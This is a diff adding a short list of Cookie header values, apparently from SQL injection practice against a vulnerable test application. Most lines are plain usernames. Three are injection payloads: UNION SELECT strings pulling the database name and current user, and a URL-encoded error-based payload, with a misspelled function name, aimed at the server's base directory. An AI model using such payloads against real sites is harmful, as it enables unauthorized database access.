@@ -1,0 +1,26 @@
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:
+Cookie:
+Cookie:
+Cookie:admin
+Cookie:
+Cookie:Dumb
+Cookie:
+Cookie:Dumb
+Cookie:admin
+Cookie:') union select 1,database(),user() #
+Cookie:admin
+Cookie:
+Cookie:Dumb
+Cookie:
+Cookie:admin
+Cookie:Dumb
+Cookie:superman
+Cookie:
+Cookie:') union select 1, database(), current_user #
+Cookie:admin
+Cookie:admin1%27%29%20and%20extravalue%281%2Cconcat%280x7e%2C%28select%20@@basedir%29%2C0x7e%29%29%20%23
+Cookie:
+Cookie:
